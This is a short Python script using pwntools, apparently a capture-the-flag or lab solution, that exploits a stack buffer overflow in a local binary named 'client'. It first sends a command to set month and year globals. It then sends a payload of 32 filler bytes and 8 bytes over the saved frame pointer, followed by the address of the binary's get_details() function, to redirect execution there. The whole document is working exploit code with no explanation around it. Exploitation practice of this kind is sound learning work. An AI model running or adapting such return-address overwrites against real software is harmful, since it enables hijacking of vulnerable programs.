#!/usr/bin/env python3
from pwn import *

# Set binary context
context.binary = exe = ELF('./client', checksec=False)

# Get the address of get_details()
get_details = exe.symbols['get_details']
log.info(f"get_details() found at: {hex(get_details)}")

# Construct payload
payload = b"A" * 32  # Fill buffer
payload += b"B" * 8   # Overwrite saved RBP
payload += p64(get_details);

# Start process
p = process('./client')

# Set up global variables before exploit
p.sendline(b"details 02 2025")  # This ensures month = 2, year = 2025

# Send the exploit payload
p.sendline(payload)

print(p.recvall(3).decode())
p.close()
